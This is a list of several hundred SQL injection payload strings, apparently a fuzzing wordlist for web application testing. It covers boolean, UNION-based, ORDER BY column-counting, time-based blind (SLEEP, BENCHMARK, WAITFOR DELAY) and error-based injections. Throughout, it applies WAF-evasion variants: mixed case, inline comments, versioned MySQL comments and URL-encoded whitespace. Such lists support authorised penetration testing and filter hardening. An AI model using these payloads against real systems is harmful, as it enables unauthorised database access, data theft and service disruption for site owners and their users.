  '" UnIoN SeLeCt 1--'
  '" UnIoN SeLeCt nUlL,NuLl,nUlL,NuLl--'
  '" UnIoN SeLeCt nUlL,NuLl,nUlL--'
  '" UnIoN SeLeCt nUlL,NuLl--'
  '" UnIoN SeLeCt nUlL--'
  '" WAITFO/**/R DELAY '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" WAITFO/**/R DELAY '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:10'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" WAITFO/**/R DELAY '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:15'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" WAITFO/**/R DELAY '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:2'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" WAITFO/**/R DELAY '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:3'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" WAITFO/**/R DELAY '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:5'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" WAITFOR DELAY '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" WAITFOR DELAY '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:10'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" WAITFOR DELAY '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:15'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" WAITFOR DELAY '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:2'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" WAITFOR DELAY '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:3'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" WAITFOR DELAY '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:5'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" WaItFo/**/R DeLaY '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" WaItFo/**/R DeLaY '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:10'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" WaItFo/**/R DeLaY '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:15'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" WaItFo/**/R DeLaY '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:2'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" WaItFo/**/R DeLaY '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:3'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" WaItFo/**/R DeLaY '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:5'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" WaItFoR DeLaY '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" WaItFoR DeLaY '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:10'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" WaItFoR DeLaY '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:15'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" WaItFoR DeLaY '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:2'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" WaItFoR DeLaY '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:3'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" WaItFoR DeLaY '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:5'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" a/**/Nd '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'
  '" a/**/Nd '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''2'
  '" a/**/Nd 1=1#'
  '" a/**/Nd 1=1--'
  '" a/**/Nd 1=1-- -'
  '" a/**/Nd 1=2--'
  '" a/**/Nd bEnChMaRk(10000000,Md5(1))--'
  '" a/**/Nd bEnChMaRk(5000000,mD5(1))--'
  '" a/**/Nd bEnChMaRk(50000000,Md5(1))--'
  '" a/**/Nd eXtRaCtVaLuE(1,CoNcAt(0X7E,(sElEcT @@VeRsIoN)))--'
  '" a/**/Nd sLeEp(0)--'
  '" a/**/Nd sLeEp(1)--'
  '" a/**/Nd sLeEp(10)--'
  '" a/**/Nd sLeEp(15)--'
  '" a/**/Nd sLeEp(2)--'
  '" a/**/Nd sLeEp(3)--'
  '" a/**/Nd sLeEp(5)--'
  '" a/**/nd 1=1#'
  '" a/**/nd 1=1--'
  '" a/**/nd 1=1-- -'
  '" aNd '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'
  '" aNd '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''2'
  '" aNd 1=1#'
  '" aNd 1=1--'
  '" aNd 1=1-- -'
  '" aNd 1=2--'
  '" aNd bEnC/**/hMaRk(10000000,Md5(1))--'
  '" aNd bEnC/**/hMaRk(5000000,mD5(1))--'
  '" aNd bEnC/**/hMaRk(50000000,Md5(1))--'
  '" aNd bEnChMaRk(10000000,Md5(1))--'
  '" aNd bEnChMaRk(5000000,mD5(1))--'
  '" aNd bEnChMaRk(50000000,Md5(1))--'
  '" aNd eXtRaC/**/tVaLuE(1,CoNcAt(0X7E,(sElEcT @@VeRsIoN)))--'
  '" aNd eXtRaCtVaLuE(1,CoNcAt(0X7E,(/*!50000SELECT*/ @@VeRsIoN)))--'
  '" aNd eXtRaCtVaLuE(1,CoNcAt(0X7E,(/*!50000sElEcT*/ @@VeRsIoN)))--'
  '" aNd eXtRaCtVaLuE(1,CoNcAt(0X7E,(sEl/**/EcT @@VeRsIoN)))--'
  '" aNd eXtRaCtVaLuE(1,CoNcAt(0X7E,(sElEcT @@VeRsIoN)))--'
  '" aNd sL/**/eEp(0)--'
  '" aNd sL/**/eEp(1)--'
  '" aNd sL/**/eEp(10)--'
  '" aNd sL/**/eEp(15)--'
  '" aNd sL/**/eEp(2)--'
  '" aNd sL/**/eEp(3)--'
  '" aNd sL/**/eEp(5)--'
  '" aNd sLeEp(0)--'
  '" aNd sLeEp(1)--'
  '" aNd sLeEp(10)--'
  '" aNd sLeEp(15)--'
  '" aNd sLeEp(2)--'
  '" aNd sLeEp(3)--'
  '" aNd sLeEp(5)--'
  '" and 1=1#'
  '" and 1=1--'
  '" and 1=1-- -'
  '" o/**/R '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'
  '" o/**/R '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''#'
  '" o/**/R '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" o/**/R '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''X'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''X'
  '" o/**/R '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''X'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''X'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" o/**/R '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'
  '" o/**/R '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" o/**/R 1=1#'
  '" o/**/R 1=1--'
  '" o/**/R 1=1-- -'
  '" o/**/R BeNcHmArK(10000000,mD5(1))--'
  '" o/**/R SlEeP(0)--'
  '" o/**/R SlEeP(1)--'
  '" o/**/R SlEeP(10)--'
  '" o/**/R SlEeP(15)--'
  '" o/**/R SlEeP(2)--'
  '" o/**/R SlEeP(3)--'
  '" o/**/R SlEeP(5)--'
  '" o/**/R%091=1--'
  '" o/**/R%0a1=1--'
  '" o/**/R%0d1=1--'
  '" o/**/RdEr bY 1--'
  '" o/**/RdEr bY 10--'
  '" o/**/RdEr bY 11--'
  '" o/**/RdEr bY 12--'
  '" o/**/RdEr bY 13--'
  '" o/**/RdEr bY 14--'
  '" o/**/RdEr bY 15--'
  '" o/**/RdEr bY 2--'
  '" o/**/RdEr bY 3--'
  '" o/**/RdEr bY 4--'
  '" o/**/RdEr bY 5--'
  '" o/**/RdEr bY 6--'
  '" o/**/RdEr bY 7--'
  '" o/**/RdEr bY 8--'
  '" o/**/RdEr bY 9--'
  '" o/**/r 1=1#'
  '" o/**/r 1=1--'
  '" o/**/r 1=1-- -'
  '" oO/**/rR 1=1--'
  '" oOrR 1=1--'
  '" oR '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'
  '" oR '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''#'
  '" oR '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" oR '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''X'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''X'
  '" oR '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''X'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''X'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" oR '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'
  '" oR '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" oR 1=1#'
  '" oR 1=1--'
  '" oR 1=1-- -'
  '" oR BeNc/**/HmArK(10000000,mD5(1))--'
  '" oR BeNcHmArK(10000000,mD5(1))--'
  '" oR Sl/**/EeP(0)--'
  '" oR Sl/**/EeP(1)--'
  '" oR Sl/**/EeP(10)--'
  '" oR Sl/**/EeP(15)--'
  '" oR Sl/**/EeP(2)--'
  '" oR Sl/**/EeP(3)--'
  '" oR Sl/**/EeP(5)--'
  '" oR SlEeP(0)--'
  '" oR SlEeP(1)--'
  '" oR SlEeP(10)--'
  '" oR SlEeP(15)--'
  '" oR SlEeP(2)--'
  '" oR SlEeP(3)--'
  '" oR SlEeP(5)--'
  '" oR%091=1--'
  '" oR%0a1=1--'
  '" oR%0d1=1--'
  '" oR/**/dEr bY 1--'
  '" oR/**/dEr bY 10--'
  '" oR/**/dEr bY 11--'
  '" oR/**/dEr bY 12--'
  '" oR/**/dEr bY 13--'
  '" oR/**/dEr bY 14--'
  '" oR/**/dEr bY 15--'
  '" oR/**/dEr bY 2--'
  '" oR/**/dEr bY 3--'
  '" oR/**/dEr bY 4--'
  '" oR/**/dEr bY 5--'
  '" oR/**/dEr bY 6--'
  '" oR/**/dEr bY 7--'
  '" oR/**/dEr bY 8--'
  '" oR/**/dEr bY 9--'
  '" oRdEr bY 1--'
  '" oRdEr bY 10--'
  '" oRdEr bY 11--'
  '" oRdEr bY 12--'
  '" oRdEr bY 13--'
  '" oRdEr bY 14--'
  '" oRdEr bY 15--'
  '" oRdEr bY 2--'
  '" oRdEr bY 3--'
  '" oRdEr bY 4--'
  '" oRdEr bY 5--'
  '" oRdEr bY 6--'
  '" oRdEr bY 7--'
  '" oRdEr bY 8--'
  '" oRdEr bY 9--'
  '" or 1=1#'
  '" or 1=1--'
  '" or 1=1-- -'
  '" uN/**/iOn aLl sElEcT 1,2,3,4,5--'
  '" uN/**/iOn aLl sElEcT 1,2,3,4--'
  '" uN/**/iOn aLl sElEcT 1,2,3--'
  '" uN/**/iOn aLl sElEcT 1,2--'
  '" uN/**/iOn aLl sElEcT 1--'
  '" uN/**/iOn sElEcT 1,2,3,4,5--'
  '" uN/**/iOn sElEcT 1,2,3,4--'
  '" uN/**/iOn sElEcT 1,2,3--'
  '" uN/**/iOn sElEcT 1,2--'
  '" uN/**/iOn sElEcT 1--'
  '" uN/**/iOn sElEcT NuLl,nUlL,NuLl,nUlL--'
  '" uN/**/iOn sElEcT NuLl,nUlL,NuLl--'
  '" uN/**/iOn sElEcT NuLl,nUlL--'
  '" uN/**/iOn sElEcT NuLl--'
  '" uNiOn /*!50000SELECT*/ 1,2,3,4,5--'
  '" uNiOn /*!50000SELECT*/ 1,2,3,4--'
  '" uNiOn /*!50000SELECT*/ 1,2,3--'
  '" uNiOn /*!50000SELECT*/ 1,2--'
  '" uNiOn /*!50000SELECT*/ 1--'
  '" uNiOn /*!50000SELECT*/ NuLl,nUlL,NuLl,nUlL--'
  '" uNiOn /*!50000SELECT*/ NuLl,nUlL,NuLl--'
  '" uNiOn /*!50000SELECT*/ NuLl,nUlL--'
  '" uNiOn /*!50000SELECT*/ NuLl--'
  '" uNiOn /*!50000sElEcT*/ 1,2,3,4,5--'
  '" uNiOn /*!50000sElEcT*/ 1,2,3,4--'
  '" uNiOn /*!50000sElEcT*/ 1,2,3--'
  '" uNiOn /*!50000sElEcT*/ 1,2--'
  '" uNiOn /*!50000sElEcT*/ 1--'
  '" uNiOn /*!50000sElEcT*/ NuLl,nUlL,NuLl,nUlL--'
  '" uNiOn /*!50000sElEcT*/ NuLl,nUlL,NuLl--'
  '" uNiOn /*!50000sElEcT*/ NuLl,nUlL--'
  '" uNiOn /*!50000sElEcT*/ NuLl--'
  '" uNiOn aLl /*!50000SELECT*/ 1,2,3,4,5--'
  '" uNiOn aLl /*!50000SELECT*/ 1,2,3,4--'
  '" uNiOn aLl /*!50000SELECT*/ 1,2,3--'
  '" uNiOn aLl /*!50000SELECT*/ 1,2--'
  '" uNiOn aLl /*!50000SELECT*/ 1--'
  '" uNiOn aLl /*!50000sElEcT*/ 1,2,3,4,5--'
  '" uNiOn aLl /*!50000sElEcT*/ 1,2,3,4--'
  '" uNiOn aLl /*!50000sElEcT*/ 1,2,3--'
  '" uNiOn aLl /*!50000sElEcT*/ 1,2--'
  '" uNiOn aLl /*!50000sElEcT*/ 1--'
  '" uNiOn aLl sEl/**/EcT 1,2,3,4,5--'
  '" uNiOn aLl sEl/**/EcT 1,2,3,4--'
  '" uNiOn aLl sEl/**/EcT 1,2,3--'
  '" uNiOn aLl sEl/**/EcT 1,2--'
  '" uNiOn aLl sEl/**/EcT 1--'
  '" uNiOn aLl sElEcT 1,2,3,4,5--'
  '" uNiOn aLl sElEcT 1,2,3,4--'
  '" uNiOn aLl sElEcT 1,2,3--'
  '" uNiOn aLl sElEcT 1,2--'
  '" uNiOn aLl sElEcT 1--'
  '" uNiOn sEl/**/EcT 1,2,3,4,5--'
  '" uNiOn sEl/**/EcT 1,2,3,4--'
  '" uNiOn sEl/**/EcT 1,2,3--'
  '" uNiOn sEl/**/EcT 1,2--'
  '" uNiOn sEl/**/EcT 1--'
  '" uNiOn sEl/**/EcT NuLl,nUlL,NuLl,nUlL--'
  '" uNiOn sEl/**/EcT NuLl,nUlL,NuLl--'
  '" uNiOn sEl/**/EcT NuLl,nUlL--'
  '" uNiOn sEl/**/EcT NuLl--'
  '" uNiOn sElEcT 1,2,3,4,5--'
  '" uNiOn sElEcT 1,2,3,4--'
  '" uNiOn sElEcT 1,2,3--'
  '" uNiOn sElEcT 1,2--'
  '" uNiOn sElEcT 1--'
  '" uNiOn sElEcT NuLl,nUlL,NuLl,nUlL--'
  '" uNiOn sElEcT NuLl,nUlL,NuLl--'
  '" uNiOn sElEcT NuLl,nUlL--'
  '" uNiOn sElEcT NuLl--'
  '" wAiTfO/**/r dElAy '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" wAiTfO/**/r dElAy '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:10'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" wAiTfO/**/r dElAy '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:15'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" wAiTfO/**/r dElAy '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:2'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" wAiTfO/**/r dElAy '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:3'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" wAiTfO/**/r dElAy '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:5'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" wAiTfOr dElAy '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" wAiTfOr dElAy '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:10'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" wAiTfOr dElAy '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:15'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" wAiTfOr dElAy '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:2'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" wAiTfOr dElAy '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:3'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '" wAiTfOr dElAy '\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:5'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"#'
  '"%09%4F%52%091=1--'
  '"%09%4f%52%091=1--'
  '"%09/*!50000UNION*/%09ALL%09SELECT%091,2,3,4,5--'
  '"%09/*!50000UNION*/%09ALL%09SELECT%091,2,3,4--'
  '"%09/*!50000UNION*/%09ALL%09SELECT%091,2,3--'
  '"%09/*!50000UNION*/%09ALL%09SELECT%091,2--'
  '"%09/*!50000UNION*/%09ALL%09SELECT%091--'
  '"%09/*!50000UNION*/%09SELECT%091,2,3,4,5--'
  '"%09/*!50000UNION*/%09SELECT%091,2,3,4--'
  '"%09/*!50000UNION*/%09SELECT%091,2,3--'
  '"%09/*!50000UNION*/%09SELECT%091,2--'
  '"%09/*!50000UNION*/%09SELECT%091--'
  '"%09/*!50000UNION*/%09SELECT%09NULL,NULL,NULL,NULL--'
  '"%09/*!50000UNION*/%09SELECT%09NULL,NULL,NULL--'
  '"%09/*!50000UNION*/%09SELECT%09NULL,NULL--'
  '"%09/*!50000UNION*/%09SELECT%09NULL--'
  '"%09A/**/ND%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'
  '"%09A/**/ND%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''2'
  '"%09A/**/ND%091=1#'
  '"%09A/**/ND%091=1--'
  '"%09A/**/ND%091=1--%09-'
  '"%09A/**/ND%091=2--'
  '"%09A/**/ND%09BENCHMARK(10000000,MD5(1))--'
  '"%09A/**/ND%09BENCHMARK(5000000,MD5(1))--'
  '"%09A/**/ND%09BENCHMARK(50000000,MD5(1))--'
  '"%09A/**/ND%09EXTRACTVALUE(1,CONCAT(0x7e,(SELECT%09@@version)))--'
  '"%09A/**/ND%09SLEEP(0)--'
  '"%09A/**/ND%09SLEEP(1)--'
  '"%09A/**/ND%09SLEEP(10)--'
  '"%09A/**/ND%09SLEEP(15)--'
  '"%09A/**/ND%09SLEEP(2)--'
  '"%09A/**/ND%09SLEEP(3)--'
  '"%09A/**/ND%09SLEEP(5)--'
  '"%09A/**/nD%091=1#'
  '"%09A/**/nD%091=1--'
  '"%09A/**/nD%091=1--%09-'
  '"%09AND%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'
  '"%09AND%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''2'
  '"%09AND%091=1#'
  '"%09AND%091=1--'
  '"%09AND%091=1--%09-'
  '"%09AND%091=2--'
  '"%09AND%09BENC/**/HMARK(10000000,MD5(1))--'
  '"%09AND%09BENC/**/HMARK(5000000,MD5(1))--'
  '"%09AND%09BENC/**/HMARK(50000000,MD5(1))--'
  '"%09AND%09BENCHMARK(10000000,MD5(1))--'
  '"%09AND%09BENCHMARK(5000000,MD5(1))--'
  '"%09AND%09BENCHMARK(50000000,MD5(1))--'
  '"%09AND%09EXTRAC/**/TVALUE(1,CONCAT(0x7e,(SELECT%09@@version)))--'
  '"%09AND%09EXTRACTVALUE(1,CONCAT(0x7e,(/*!50000SELECT*/%09@@version)))--'
  '"%09AND%09EXTRACTVALUE(1,CONCAT(0x7e,(SEL/**/ECT%09@@version)))--'
  '"%09AND%09EXTRACTVALUE(1,CONCAT(0x7e,(SELECT%09@@version)))--'
  '"%09AND%09SL/**/EEP(0)--'
  '"%09AND%09SL/**/EEP(1)--'
  '"%09AND%09SL/**/EEP(10)--'
  '"%09AND%09SL/**/EEP(15)--'
  '"%09AND%09SL/**/EEP(2)--'
  '"%09AND%09SL/**/EEP(3)--'
  '"%09AND%09SL/**/EEP(5)--'
  '"%09AND%09SLEEP(0)--'
  '"%09AND%09SLEEP(1)--'
  '"%09AND%09SLEEP(10)--'
  '"%09AND%09SLEEP(15)--'
  '"%09AND%09SLEEP(2)--'
  '"%09AND%09SLEEP(3)--'
  '"%09AND%09SLEEP(5)--'
  '"%09AnD%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'
  '"%09AnD%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''2'
  '"%09AnD%091=1#'
  '"%09AnD%091=1--'
  '"%09AnD%091=1--%09-'
  '"%09AnD%091=2--'
  '"%09AnD%09BeNcHmArK(10000000,mD5(1))--'
  '"%09AnD%09BeNcHmArK(5000000,Md5(1))--'
  '"%09AnD%09BeNcHmArK(50000000,mD5(1))--'
  '"%09AnD%09ExTrAcTvAlUe(1,cOnCaT(0x7e,(SeLeCt%09@@vErSiOn)))--'
  '"%09AnD%09SlEeP(0)--'
  '"%09AnD%09SlEeP(1)--'
  '"%09AnD%09SlEeP(10)--'
  '"%09AnD%09SlEeP(15)--'
  '"%09AnD%09SlEeP(2)--'
  '"%09AnD%09SlEeP(3)--'
  '"%09AnD%09SlEeP(5)--'
  '"%09O/**/R%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'
  '"%09O/**/R%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''#'
  '"%09O/**/R%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%09O/**/R%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'
  '"%09O/**/R%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%09O/**/R%091=1#'
  '"%09O/**/R%091=1--'
  '"%09O/**/R%091=1--%09-'
  '"%09O/**/R%09BENCHMARK(10000000,MD5(1))--'
  '"%09O/**/R%09SLEEP(0)--'
  '"%09O/**/R%09SLEEP(1)--'
  '"%09O/**/R%09SLEEP(10)--'
  '"%09O/**/R%09SLEEP(15)--'
  '"%09O/**/R%09SLEEP(2)--'
  '"%09O/**/R%09SLEEP(3)--'
  '"%09O/**/R%09SLEEP(5)--'
  '"%09O/**/R%0a1=1--'
  '"%09O/**/R%0d1=1--'
  '"%09O/**/RDER%09BY%091--'
  '"%09O/**/RDER%09BY%0910--'
  '"%09O/**/RDER%09BY%0911--'
  '"%09O/**/RDER%09BY%0912--'
  '"%09O/**/RDER%09BY%0913--'
  '"%09O/**/RDER%09BY%0914--'
  '"%09O/**/RDER%09BY%0915--'
  '"%09O/**/RDER%09BY%092--'
  '"%09O/**/RDER%09BY%093--'
  '"%09O/**/RDER%09BY%094--'
  '"%09O/**/RDER%09BY%095--'
  '"%09O/**/RDER%09BY%096--'
  '"%09O/**/RDER%09BY%097--'
  '"%09O/**/RDER%09BY%098--'
  '"%09O/**/RDER%09BY%099--'
  '"%09O/**/r%091=1#'
  '"%09O/**/r%091=1--'
  '"%09O/**/r%091=1--%09-'
  '"%09OO/**/RR%091=1--'
  '"%09OORR%091=1--'
  '"%09OR%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'
  '"%09OR%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''#'
  '"%09OR%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%09OR%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'
  '"%09OR%09'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%09OR%091=1#'
  '"%09OR%091=1--'
  '"%09OR%091=1--%09-'
  '"%09OR%09BENC/**/HMARK(10000000,MD5(1))--'
  '"%09OR%09BENCHMARK(10000000,MD5(1))--'
  '"%09OR%09SL/**/EEP(0)--'
  '"%09OR%09SL/**/EEP(1)--'
  '"%09OR%09SL/**/EEP(10)--'
